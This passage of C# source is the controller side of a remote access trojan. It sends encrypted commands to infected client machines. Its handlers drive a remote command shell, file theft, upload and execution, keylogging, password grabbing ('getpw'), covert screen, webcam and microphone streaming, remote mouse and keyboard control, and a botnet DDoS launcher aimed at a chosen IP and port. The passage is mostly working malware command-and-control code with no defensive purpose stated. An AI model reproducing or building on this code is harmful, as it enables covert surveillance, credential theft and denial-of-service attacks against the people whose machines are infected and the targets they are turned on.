            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            Console.WriteLine("Encrypted Command: " + clearText);
            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                Console.WriteLine("Decrypt error");
                return cipherText;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                List<int> clients = new List<int>();

                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    int id = int.Parse(lvi.SubItems[0].Text.Replace("Client ", ""));
                    clients.Add(id);
                }

                controlClients = clients.ToArray();
            }
        }

        private void sendCommand(string command, int targetClient)
        {

            try
            {
                Socket s = _clientSockets[targetClient];//-put in the try catch as the program crashed

                try
                {


                    string k = command;

                    string crypted = Encrypt(k);
                    byte[] data = Encoding.Unicode.GetBytes(crypted);
                    s.Send(data);
                }
                catch (Exception)
                {
                    int id = targetClient;
                    reScanTarget = true;
                    reScanStart = id;
                    Console.WriteLine("Client forcefully disconnected");
                    s.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                    _clientSockets.Remove(s);
                    switchTab(tabControl1.TabPages[0]);
                    restartServer(id);
                    return;
                }
            }
            catch
            {

            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            string title = textBox1.Text;
            string text = textBox2.Text;
            string icons = comboBox1.SelectedItem.ToString();
            string buttons = comboBox2.SelectedItem.ToString();
            int ico = 0;
            int btn = 0;

            // Map icons and buttons to int numbers!

            switch (icons)
            {
                case "Error":
                    ico = 1;
                    break;

                case "Warning":
                    ico = 2;
                    break;

                case "Information":
                    ico = 3;
                    break;

                case "Question":
                    ico = 4;
                    break;

                case "None":
                    ico = 0;
                    break;
            }

            switch (buttons)
            {
                case "Yes No":
                    btn = 1;
                    break;

                case "Yes No Cancel":
                    btn = 2;
                    break;

                case "Abort Retry Ignore":
                    btn = 3;
                    break;

                case "Ok Cancel":
                    btn = 4;
                    break;

                case "Ok":
                    btn = 0;
                    break;
            }

            //Construct data

            string cmd = "msg|" + title + "|" + text + "|" + ico + "|" + btn;
            loopSend(cmd);
        }

        public void loopSend(string command)
        {
            foreach (int client in controlClients)
            {
                sendCommand(command, client);
            }
        }

        private void loopSendByte(byte[] data)
        {
            foreach (int client in controlClients)
            {
                sendCommand(data, client);
            }
        }

        private void sendCommand(byte[] data, int targetClient)
        {
            Socket s = _clientSockets[targetClient];
            s.Send(data);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            string cmd = "freq-" + textBox3.Text;
            loopSend(cmd);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string opt = comboBox3.SelectedItem.ToString();
            string code = "0";

            switch (opt)
            {
                case "Beep":
                    code = "0";
                    break;

                case "Error":
                    code = "1";
                    break;

                case "Warning":
                    code = "2";
                    break;

                case "Information":
                    code = "3";
                    break;
            }

            string cmd = "sound-" + code;
            loopSend(cmd);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            string text = richTextBox1.Text;
            string cmd = "t2s|" + text; // again dont use "|" in the text

            loopSend(cmd);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            string cmd = "cd|open";

            loopSend(cmd);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            string cmd = "cd|close";

            loopSend(cmd);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            string cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|clock";
                c.Text = "Clock: Hidden";
            }
            else
            {
                cmd = "emt|show|clock";
                c.Text = "Clock: Visible";
            }

            loopSend(cmd);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            string cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|task";
                c.Text = "Task Bar: Hidden";
            }
            else
            {
                cmd = "emt|show|task";
                c.Text = "Task Bar: Visible";
            }

            loopSend(cmd);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            string cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|desktop";
                c.Text = "Desktop Icons: Hidden";
            }
            else
            {
                cmd = "emt|show|desktop";
                c.Text = "Desktop Icons: Visible";
            }

            loopSend(cmd);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            string cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|tray";
                c.Text = "Tray Icons: Hidden";
            }
            else
            {
                cmd = "emt|show|tray";
                c.Text = "Tray Icons: Visible";
            }

            loopSend(cmd);
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            string cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|start";
                c.Text = "Start Menu: Hidden";
            }
            else
            {
                cmd = "emt|show|start";
                c.Text = "Start Menu: Visible";
            }

            loopSend(cmd);
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string cmd = "proclist";
            listView2.Items.Clear();
            loopSend(cmd);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 0)
            {
                string id = listView2.SelectedItems[0].SubItems[1].Text; // process id
                string cmd = "prockill|" + id;

                loopSend(cmd);

                System.Threading.Thread.Sleep(1000);
                listView2.Items.Clear();
                loopSend("proclist");
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if (textBox4.Text != "")
            {
               
                    string cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString();

                    loopSend(cmd);
                    textBox4.Clear();
                    System.Threading.Thread.Sleep(1000);
                    loopSend("proclist");
               
            }
        }

        private void btnStopStartCmd_Click(object sender, EventArgs e)
        {
            if (!isCmdStarted)
            {
                string command = "startcmd";
                loopSend(command);
                isCmdStarted = true;
                button15.Text = "Stop Cmd";
                lblCMD.BackColor = Color.Green;
                lblCMD.Text = "Enter Text Here and Press The Enter Key To Send Command To Remote Command Prompt";
                
            }
         
            else
            {
                string command = "stopcmd";
                loopSend(command);
                isCmdStarted = false;
                button15.Text = "Start Cmd";
                lblCMD.BackColor = Color.White;
                lblCMD.Text = "Connect To The Client and Start CMD ";
                lblCMD.BackColor = Color.White;
                lblCMD.Text = "Connect To The Client and Start CMD ";
            }
          
        }

        private void textBox5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && isCmdStarted)
            {
                string command = "cmd§" + textBox5.Text;
                if (command == "cmd§cls") richTextBoxCMD.Clear();
                textBox5.Text = "";
                if (command == "cmd§exit")
                {
                    DialogResult result = MessageBox.Show(this, "Do you want to exit the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                    if (result == DialogResult.Yes)
                    {
                        loopSend("stopcmd");
                        button15.Text = "Start Cmd";
                        isCmdStarted = false;
                        return;
                    }
                    else if (result == DialogResult.Cancel)
                    {
                        return;
                    }
                }
                loopSend(command);
            }
            else if (e.KeyCode == Keys.Return && !isCmdStarted)
            {
                MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string command = "fdrive";
            loopSend(command);
        }

        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedIndices.Count > 0)
            {
                if ((listView3.SelectedItems[0].SubItems[0].Text.Length != 3 && !listView3.SelectedItems[0].SubItems[0].Text.EndsWith(":\\")) && listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                {
                    MessageBox.Show(this, "The selected item is not a directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                string fullPath = listView3.SelectedItems[0].SubItems[3].Text;
                string command = "fdir§" + fullPath;
                loopSend(command);
                current_path = fullPath;
                listView3.Items.Clear();
            }
            else
            {
                MessageBox.Show(this, "No directory is selected", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (current_path == "drive")
            {
                MessageBox.Show(this, "Action cancelled!", "You are at the top of the file tree!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            string cmd = "f1§" + current_path;
            loopSend(cmd);
        }

        private void refresh()
        {
            Application.DoEvents();
            System.Threading.Thread.Sleep(1500);
            listView3.Items.Clear();
            string cmd = "fdir§" + current_path;
            loopSend(cmd);
        }

        private void moveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                xfer_path = path;
                xfer_mode = xfer_move;
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                xfer_path = path;
                xfer_mode = xfer_copy;
            }
        }

        private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string cmd = "fpaste§" + current_path + "§" + xfer_path + "§" + xfer_mode;
            loopSend(cmd);
            refresh();
        }

        private void selectedDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                bool isDir = false;
                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") isDir = true;
                if (!isDir)
                {
                    MessageBox.Show(this, "You can only paste a file into a directory", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                loopSend("fpaste§" + path + "§" + xfer_path + "§" + xfer_mode);
                refresh();
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                string command = "fexec§" + path;
                loopSend(command);
            }
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                string command = "fhide§" + path;
                loopSend(command);
            }
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                string command = "fshow§" + path;
                loopSend(command);
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                string command = "fdel§" + path;
                loopSend(command);
                refresh();
            }
        }

        public DialogResult InputBox(string title, string promptText, ref string value)
        {
            //This code is from http://www.csharp-examples.net/inputbox/
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                string newName = "";
                bool validOperation = false;
                if (InputBox("Rename", "Please enter the new name of the file / directory!", ref newName) == DialogResult.OK)
                {
                    validOperation = true;
                }
                if (!validOperation) return;
                string cmd = "frename§" + path + "§" + newName;
                loopSend(cmd);
                refresh();
            }
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = current_path;
            string name = "";
            bool validOperation = false;
            if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) == DialogResult.OK)
            {
                validOperation = true;
            }
            if (!validOperation) return;
            string command = "ffile§" + path + "§" + name;
            loopSend(command);
            refresh();
        }

        private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = current_path;
            string name = "";
            bool validOperation = false;
            if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) == DialogResult.OK)
            {
                validOperation = true;
            }
            if (!validOperation) return;
            string command = "fndir§" + path + "§" + name;
            loopSend(command);
            refresh();
        }

        public void saveFile(string content)
        {
            string cmd = "putfile§" + edit_content + "§" + content;
            loopSend(cmd);
            refresh();
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text;
                bool validOperation = false;
                if (listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                {
                    validOperation = true;
                }
                if (!validOperation) return;
                string cmd = "getfile§" + path;
                edit_content = path;
                loopSend(cmd);
            }
        }

        private void currentDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string dir = current_path;
            string file = "";
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                file = ofd.FileName;
                dir += "\\" + new FileInfo(file).Name;
                string cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
                fup_local_path = file;
                //uploadFinished = false;
                loopSend(cmd);
            }
        }

        private void selectedDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                string dir = listView3.SelectedItems[0].SubItems[3].Text;
                string file = "";
                OpenFileDialog ofd = new OpenFileDialog();
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    file = ofd.FileName;
                    dir += "\\" + new FileInfo(file).Name;
                    string cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
                    fup_local_path = file;
                    //uploadFinished = false;
                    loopSend(cmd);
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") return;
                string dir = listView3.SelectedItems[0].SubItems[3].Text;
                string cmd = "fdl§" + dir;
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = listView3.SelectedItems[0].SubItems[0].Text;
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    fdl_location = sfd.FileName;
                    loopSend(cmd);
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_clientSockets.Count > 0) CloseAllSockets();
        }

        private void button16_Click(object sender, EventArgs e)
        {
            loopSend("sklog");
        }

        private void button17_Click(object sender, EventArgs e)
        {
            loopSend("stklog");
        }

        private void button18_Click(object sender, EventArgs e)
        {
            loopSend("rklog");
        }

        private void button19_Click(object sender, EventArgs e)
        {
            loopSend("cklog");
        }

        private void btnStartRemoteScreen_Click(object sender, EventArgs e)
        {
            btnCountScreens.Enabled = false;
            cmboChooseScreen.Enabled = false;
            trackBar1.Enabled = false;

            if (cmboChooseScreen.SelectedItem != null)
            {
                loopSend("screenNum" + cmboChooseScreen.SelectedItem.ToString());
            }
            System.Threading.Thread.Sleep(1500);
            multiRecv = true;
            rdesktop = true;
            loopSend("rdstart");



            //-------------------
            // rkeyboard = 1; //check to see if i can input keyboard controls

        }

        private void btnStopRemoteScreen_Click(object sender, EventArgs e)
        {
            btnCountScreens.Enabled = true;
            cmboChooseScreen.Enabled = true;
            trackBar1.Enabled = true;

            loopSend("rdstop");
            Application.DoEvents();
            System.Threading.Thread.Sleep(2000); //was 1500

            checkBoxrMouse.Checked = false; //----------------------------i moved these out here as they were still in control with no updated pic
            checkBoxrKeyboard.Checked = false;

            if (!austream && !wStream)
            {
                multiRecv = false;
                rdesktop = false;
                isrdFull = false;
                //checkBoxrMouse.Checked = false;
                //checkBoxrKeyboard.Checked = false;

                try
                {
                    pictureBox1.Image.Dispose();
                    pictureBox1.Image = null;
                }
                catch
                {

                }
            }
            if (Rdxref == null) return;
            Rdxref.Close();
            Rdxref.Dispose();
            Rdxref = null;

            if (rmoveTimer != null)
            {
                rmoveTimer.Stop();
                rmoveTimer.Dispose();
                rmoveTimer = null;
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            Rectangle scr = Screen.PrimaryScreen.WorkingArea;
            if (!isrdFull)
            {
                
                scr = pictureBox1.DisplayRectangle;
            }
            try
            {
                int mx = (e.X * resx) / scr.Width;
                int my = (e.Y * resy) / scr.Height;

                if (rmouse == 1)
                {
                    if (plx != e.X || ply != e.Y)
                    {
                        rMoveCommands.Add("rmove-" + mx + ":" + my);
                        plx = e.X;
                        ply = e.Y;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("mouse move rd error ERROR = " + ex.Message);
            }
        }

        private void rmoveTickEventHandler(object sender, EventArgs e)
        {
            if (rmouse == 1)
            {
                if (rMoveCommands.Count > 0)
                {
                    loopSend(rMoveCommands[rMoveCommands.Count - 1]);
                    rMoveCommands.Clear();
                }
            }
        }

        private void checkBoxrMouse_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxrMouse.Checked)
            {
                rmoveTimer = new Timer();
                // rmoveTimer.Interval = 200; //-------------------------changed this was 1000 but it was clitchy
                rmoveTimer.Interval = FPS; //now the mouse will move with the frame rate
                rmoveTimer.Tick += new EventHandler(rmoveTickEventHandler);
                rmoveTimer.Start();
                rmouse = 1;
            }
            else
            {
                rmouse = 0;
                if (rmoveTimer != null)
                {
                    rmoveTimer.Stop(); //this threw an exception because it was already stopped
                    rmoveTimer.Dispose();
                    rmoveTimer = null;
                }
            }
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {

            if (rmouse == 1)
            {
                if (e.Button == MouseButtons.Left)
                {
                    loopSend("rclick-left-down");
                }

                else
                {
                    loopSend("rclick-right-down");
                }
            }
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (rmouse == 1)
            {
                if (e.Button == MouseButtons.Left)
                {
                    loopSend("rclick-left-up");
                }

                else
                {
                    loopSend("rclick-right-up");
                }
            }
        }

        private void checkBoxrKeyboard_CheckedChanged(object sender, EventArgs e)
        {
           

            if (checkBoxrKeyboard.Checked)//i fixed this to work in scale mode too
            {
               // MessageBox.Show(this, "The remote keyboard feature only works in full screen mode!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                rkeyboard = 1;
            }
         
        }

        private void btnFullRemoteScreen_Click(object sender, EventArgs e)
        {
            RDesktop full = new RDesktop();
            full.Show();
            Rdxref = full;
            isrdFull = true;
        }

        private void button20_Click(object sender, EventArgs e)
        {
            only1 = true;
        }

        public void executeToolStrip(string name)
        {
            int track = 0;

            foreach (string refname in tsrefname)
            {
                if (refname != name)
                {
                    track++;
                    continue;
                }
                tsitem[track].PerformClick();
                track++;
                break;
            }
        }

        public static string getValue(string name)
        {
            string val = "";
            foreach (string entry in getvalue)
            {
                string key = entry.Split('§')[0];

                if (key == name)
                {
                    val = entry.Split('§')[1];
                }
            }

            return val;
        }

        public int getSelectedIndex(string name)
        {
            int val = 0;
            foreach (string entry in getvalue)
            {
                string key = entry.Split('§')[0];

                if (key == name)
                {
                    val = int.Parse(entry.Split('§')[1]);
                }
            }
            return val;
        }

        public string getSelectedItem(string name)
        {
            string val = "";
            foreach (string entry in getvalue)
            {
                string key = entry.Split('§')[0];

                if (key == name)
                {
                    val = entry.Split('§')[1];
                }
            }
            return val;
        }

        public bool getChecked(string name)
        {
            bool val = false;
            string ret = "";
            foreach (string entry in getvalue)
            {
                string key = entry.Split('§')[0];
                if (key == name)
                {
                    ret = entry.Split('§')[1];
                }
            }

            ret = ret.ToLower();

            if (ret == "true")
            {
                val = true;
            }
            else
            {
                val = false;
            }

            return val;
        }

        public string[] getItems(string name, string mode)
        {
            List<string> ret = new List<string>();
            Control lvc = Controls.Find(name, true)[0];
            ListView lv = (ListView)lvc;
            if (mode == "selected")
            {
                foreach (string entry in getvalue)
                {
                    string key = entry.Split('§')[0];
                    if (key == name)
                    {
                        int subCount = entry.LastIndexOf('§') + 1;
                        string sItem = entry.Substring(subCount);
                        ret.Add(sItem);
                    }
                }
            }
            if (mode == "items")
            {
                foreach (string entry in getvalue)
                {
                    string key = entry.Split('§')[0];
                    if (key == name)
                    {
                        string nameString = entry.Split('§')[0];
                        int subS = nameString.Length + 1;
                        string lvString = entry.Substring(subS);
                        int subE = lvString.LastIndexOf('§');
                        if (subE == -1) return ret.ToArray();
                        lvString = lvString.Substring(0, subE);

                        foreach (string item in lvString.Split('§'))
                        {
                            ret.Add(item);
                        }
                    }
                }
            }
            return ret.ToArray();
        }

        private void tabControl1_Click(object sender, EventArgs e)
        {
            MouseEventArgs me = (MouseEventArgs)e;

            if (me.Button == MouseButtons.Right)
            {
                ContextMenuStrip cms = new ContextMenuStrip();
                cms.Items.Add("Route Window");
                cms.Items[0].Click += new EventHandler(rwind);
                cms.Show(Cursor.Position);
            }
        }

        private void rwind(object sender, EventArgs e)
        {
            TabPage srcRoute = tabControl1.SelectedTab;
            routeWindow rw = new routeWindow();
            rw.page = srcRoute;
            rw.routePage();
        }

        private void button24_Click(object sender, EventArgs e)
        {
            loopSend("alist");
        }

        private void button25_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
            {
                if (!austream)
                {
                    int deviceNumber = listView4.SelectedItems[0].Index;
                    multiRecv = true;
                    austream = true;
                    astream = new audioStream();
                    astream.init();
                    loopSend("astream§" + deviceNumber.ToString());
                    button25.Text = "Stop Stream";
                    return;
                }

                if (austream)
                {
                    loopSend("astop");
                    if (!rdesktop && !wStream)
                    {
                        Application.DoEvents();
                        System.Threading.Thread.Sleep(1200); //was 1500
                        multiRecv = false;
                    }
                    austream = false;
                    astream.destroy();
                    astream = null;
                    button25.Text = "Start Stream";
                }
            }
        }

        private void button26_Click(object sender, EventArgs e)
        {
            loopSend("wlist");
        }

        private void button27_Click(object sender, EventArgs e)
        {
            if (!wStream && listView5.SelectedItems.Count > 0)
            {
                string id = listView5.SelectedItems[0].SubItems[0].Text;
                string command = "wstream§" + id;
                multiRecv = true;
                wStream = true;
                button27.Text = "Stop stream";
                loopSend(command);
                return;
            }

            if (wStream)
            {
                if (!rdesktop && !austream)
                {
                    Application.DoEvents();
                    System.Threading.Thread.Sleep(1500); //was 1500
                    multiRecv = false;
                }
                wStream = false;
                button27.Text = "Start Stream";
                loopSend("wstop");
            }
        }

        private void button29_Click(object sender, EventArgs e)
        {
            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return;
            string ip = textBox6.Text;
            string prot = comboBox5.SelectedItem.ToString();

            if (prot == "ICMP ECHO (Ping)")
            {
                System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
                System.Net.NetworkInformation.PingReply reply = ping.Send(ip, 1000, Encoding.Unicode.GetBytes("Test"));
                if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
                {
                    MessageBox.Show(this, "Ping success with 1 second timeout and 4 bytes of data (test)", "Target responded to ping", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show(this, "Ping failed with 1 second timeout and 4 bytes of data (test)", "Target didnt responded to ping!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            if (prot == "TCP")
            {
                TcpClient client = new TcpClient();
                try
                {
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString()));
                    if (client.Connected)
                    {
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            if (prot == "UDP")
            {
                try
                {
                    UdpClient client = new UdpClient();
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString()));
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), int.Parse(numericUpDown1.Value.ToString()));
                    client.Send(new byte[] { 0x0, 0x1, 0x2, 0x3 }, 4, ep);
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception)
                {
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }

        private void button28_Click(object sender, EventArgs e)
        {
            bool isAllClient = checkBox3.Checked;
            string ip = textBox6.Text;
            string port = numericUpDown1.Value.ToString();
            string protocol = comboBox5.SelectedItem.ToString();
            string packetSize = numericUpDown2.Value.ToString();
            string threads = numericUpDown3.Value.ToString();
            string delay = numericUpDown4.Value.ToString();
            string command = "ddosr|" + ip + "|" + port + "|" + protocol + "|" + packetSize + "|" + threads + "|" + delay;
            if (isAllClient)
            {
                int inc = 0;
                foreach (Socket s in _clientSockets)
                {
                    sendCommand(command, inc);
                    inc++;
                }
                label18.Text = "Status: DDoS Started [Client_Count:" + inc.ToString() + " Target_IP:" + ip + " Target_Port:" + port + "]";
            }
            else
            {
                loopSend(command);
                label18.Text = "Status: DDoS Started [Client_Count:1 Target_IP:" + ip + " Target_Port:" + port + "]";
            }
        }

        private void button30_Click(object sender, EventArgs e)
        {
            string command = "ddosk";
            int count = 0;
            foreach (Socket s in _clientSockets)
            {
                sendCommand(command, count);
                count++;
            }
            label18.Text = "Status: DDoS Stopped for all clients!";
        }

        private void button32_Click(object sender, EventArgs e)
        {
            listView6.Clear();
        }

        private void button31_Click(object sender, EventArgs e)
        {
            loopSend("getpw");
        }
        //this sets the frame send rate on client and server
        //frames per second the client also has to match this so a send cmd and mouse movements to match
        private int FPS = 80;
        public void ScreenFPS()
        {
            Form1 f1 = new Form1();
            int value = f1.trackBar1.Value;
            f1.lblQualityShow.Text = value.ToString();

            if (value < 25)  
                FPS = 150;  //low
            else if (value >= 75 && value <= 85)
                FPS = 80; //best
            else if (value >= 85)
                FPS = 50; //high
            else if (value >= 25)
                FPS = 100; //mid
        }

        //the track bar that sets the frame update
        private void trackBar1_Scroll(object sender, EventArgs e) 
        {

            int value = trackBar1.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
            {
                lblQualityShow.Text += "(low)";
                loopSend("fpslow");
            }
         else if (value >= 75 && value <= 85)
            {
                lblQualityShow.Text += "(best)";
                loopSend("fpsbest");
            }
            else if (value >= 85)
            {
                lblQualityShow.Text += "(high)";
                loopSend("fpshigh");
            }
            else if (value >= 25)
            {
                lblQualityShow.Text += "(mid)";
                loopSend("fpsmid");
            }


            ActiveControl = pictureBox1;
        }

      
        private void Form1_Load(object sender, EventArgs e)
        {

        }
        // this is how i get the key strokes by an invisable textbox enteries to send to the client
        private void pictureBox1_Click_1(object sender, EventArgs e)
        {
            txtBControlKeyboard.Focus();  

         
        }
        // now it can send lower case, uppercase and modifier keys to the client
        private void txtBControlKeyboard_KeyDown(object sender, KeyEventArgs e)  
        {
            
            if (rkeyboard == 1)
            {

                string keysToSend = "";

                if (e.Shift)
                    keysToSend += "+";
                if (e.Alt)
                    keysToSend += "%";
                if (e.Control)
                    keysToSend += "^";

                if (Console.CapsLock == false)
                {

                    if (e.KeyValue >= 65 && e.KeyValue <= 90)
                    {
